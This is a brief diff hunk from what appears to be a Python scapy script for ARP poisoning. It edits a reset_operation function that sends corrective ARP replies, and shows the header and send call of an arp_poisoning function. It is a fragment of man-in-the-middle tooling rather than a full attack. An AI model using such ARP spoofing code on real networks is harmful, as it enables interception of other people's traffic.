@@ -27,8 +27,8 @@ def arp_poisoning(target_ip,poisoned_ip):
     scapy.send(arp_response,verbose=False)
 
 def reset_operation(fooled_ip,gateway_ip):
-    fooled_mac = get_mac_address(fooled_ip)
-    gateway_mac = get_mac_address(gateway_ip);
+    fooled_mac = get_mac_address(str(fooled_ip))
+    gateway_mac = get_mac_address(str(gateway_ip));
     arp_response = scapy.ARP(op=2,pdst=str(fooled_ip),hwdst=str(fooled_mac),psrc=str(gateway_ip),hwsrc=str(gateway_mac))
     scapy.send(arp_response,verbose=False,count=10)
 
